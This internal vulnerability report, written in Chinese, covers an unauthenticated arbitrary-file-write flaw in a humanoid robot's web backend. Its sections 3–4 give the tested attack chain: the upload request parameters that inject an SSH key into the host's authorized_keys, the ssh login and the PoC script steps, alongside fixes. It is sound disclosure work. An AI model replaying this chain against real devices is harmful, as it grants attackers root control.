---
编号: UBH-009
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: api-sysupload任意路径写-宿主root-RCE
---
# UBH-009 t800-web-backend 任意路径写 → 【宿主 root】RCE（容器 root + 宿主 bind-mount）

## 1. 一句话结论

- # t800-web-backend 任意路径写 → 【宿主 root】RCE（容器 root + 宿主 bind-mount）
- > 版本：2026-08-29 · **实机验证**：未认证 → 写宿主 `/root/.ssh/authorized_keys` → `ssh root@vision` → 宿主 root shell ✅
- > 与 RCE#1（跨板 motion）**同根因**（`/api/sysupload` 未认证任意写），但影响升级为**宿主根权限**。
- ## 1. 执行摘要
- \| 宿主 Source \| 容器 Dest \| 权限 \|

## 2. 影响产品与版本

- > 版本：2026-08-29 · **实机验证**：未认证 → 写宿主 `/root/.ssh/authorized_keys` → `ssh root@vision` → 宿主 root shell ✅

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- > 版本：2026-08-29 · **实机验证**：未认证 → 写宿主 `/root/.ssh/authorized_keys` → `ssh root@vision` → 宿主 root shell ✅
- > 与 RCE#1（跨板 motion）**同根因**（`/api/sysupload` 未认证任意写），但影响升级为**宿主根权限**。
- 严重度：**严重（Critical）**——未认证任意文件写直达宿主 root。
- ## 2. 关键根因（比 RCE#1 新增的部分）
- 同一 `sysupload` 根因的两种最大影响：

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # t800-web-backend 任意路径写 → 【宿主 root】RCE（容器 root + 宿主 bind-mount）
- > 版本：2026-08-29 · **实机验证**：未认证 → 写宿主 `/root/.ssh/authorized_keys` → `ssh root@vision` → 宿主 root shell ✅
- > 与 RCE#1（跨板 motion）**同根因**（`/api/sysupload` 未认证任意写），但影响升级为**宿主根权限**。
- `walker-web.web-backend-1`（t800-web-backend v0.2.9）**以 root 运行**（`Config.User` 为空），
- \| `/root/.ssh` \| `/root/.ssh` \| rw \|
- 攻击者仅凭 HTTP 写宿主 root 的 `authorized_keys` → **`ssh <访问令牌_01>.168.11.3` → 宿主 root shell**

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# t800-web-backend 任意路径写 → 【宿主 root】RCE（容器 root + 宿主 bind-mount）

> 版本：2026-08-29 · **实机验证**：未认证 → 写宿主 `/root/.ssh/authorized_keys` → `ssh root@vision` → 宿主 root shell ✅
> 与 RCE#1（跨板 motion）**同根因**（`/api/sysupload` 未认证任意写），但影响升级为**宿主根权限**。

---

## 1. 执行摘要

`walker-web.web-backend-1`（t800-web-backend v0.2.9）**以 root 运行**（`Config.User` 为空），
且 bind-mount 直通宿主文件系统（`docker inspect` 实锤）：

| 宿主 Source | 容器 Dest | 权限 |
|---|---|---|
| `/root/.ssh` | `/root/.ssh` | rw |
| `/etc/walker` | `/etc/walker` | rw |
| `/tmp` | `/tmp` | rw |
| `/home/walker/.ssh` | `/home/ubt/.ssh` | rw |
| `/etc/localtime` `/etc/timezone` | 同 | rw |

因此 `/api/sysupload board_name=vision` 的“任意路径写”实际落在**宿主文件系统**。
攻击者仅凭 HTTP 写宿主 root 的 `authorized_keys` → **`ssh <访问令牌_01>.168.11.3` → 宿主 root shell**
（实测 `uid=0(root)`，`uname=aarch64`，无需跨板、无需任何前置凭证）。

严重度：**严重（Critical）**——未认证任意文件写直达宿主 root。

## 2. 关键根因（比 RCE#1 新增的部分）

- **容器以 root 运行**（镜像未降权，`User` 为空）；
- **宿主敏感目录被 rw bind-mount 进容器**：`/root/.ssh`、`/etc/walker`、`/tmp`；
- 宿主 `/root/.ssh` **可写**（此前误判为只读——HTTP 500 实为 EISDIR：`os.makedirs(path)`
  把 `path` 建成目录导致 `open()` 撞目录。本机 `docker inspect` 显示该 mount 为 `rw`）。

## 3. 攻击链（实测）

```
POST :5000/api/sysupload  board_name=vision  path=/root/.ssh  filename=authorized_keys
  内容 = 原 authorized_keys(111B) + 新 RSA 公钥
  → 容器 root 经 bind-mount 直接写宿主 /root/.ssh/authorized_keys
  → ssh -i 新私钥 <访问令牌_01>.168.11.3  →  uid=0(root)  hostname=vision  uname=aarch64
  → 宿主 root shell ✅
```

## 4. 复现（实机验证）

`python scripts/vision_host_root_rce.py --rce` 全流程：
```
[1] 探针   path=/root/.ssh filename=.write_probe_<rand> → HTTP 200 → export 读回一致 → 宿主可写 ✅
[2] 备份   export 穿越读宿主 /root/.ssh/authorized_keys（111B）→ evidence/backup_authorized_keys.host_root
[3] 注入   path=/root/.ssh filename=authorized_keys（原内容+新公钥）→ HTTP 200
[4] SHELL  ssh -i 新私钥 <访问令牌_01>.168.11.3 → uid=0(root) vision aarch64  ✅
[5] 恢复   写回原 111B chmod 600 → wc=111 ✅
```
> 实测输出：`evidence/host_root_rce_2026-08-29.txt`
> 手动 shell：`ssh -i scripts/host_root_key.pem <访问令牌_01>.168.11.3`

**无害探针**：`python scripts/vision_host_root_rce.py --probe`（写/读/清探针文件，不动 authorized_keys）。

## 5. 与 RCE#1 的关系

同一 `sysupload` 根因的两种最大影响：
- RCE#1：`board_name=motion` 跨板 SFTP 写 motion 板 → motion root（依赖后端 SFTP 通道 + 硬编码 <密码_01>）；
- RCE#2：`board_name=vision` 容器本地写 → **宿主** root（依赖容器 root + 宿主 bind-mount）。
RCE#2 影响更大、链路更短。

## 6. 修复建议

1. 镜像降权：容器不以 root 运行（`USER` 非 root + 无特权）；
2. 移除 `/root/.ssh`、`/etc/walker` 等宿主敏感目录的 rw bind-mount（只读或数据卷）；
3. `/api/sysupload` 认证 + `path` 白名单（同 RCE#1 建议）。

## 7. 证据文件

| 文件 | 内容 |
|---|---|
| `evidence/host_root_rce_2026-08-29.txt` | 完整实机宿主 root RCE 输出 |
| `evidence/backup_authorized_keys.host_root` | 宿主原 `authorized_keys`（111B，恢复用） |
| `scripts/vision_host_root_rce.py` | 全链 PoC（`--probe` 无害 / `--rce` / `--restore`） |
| `scripts/check_root_ssh.py` | 查看宿主 `/root/.ssh` 现状（只读） |
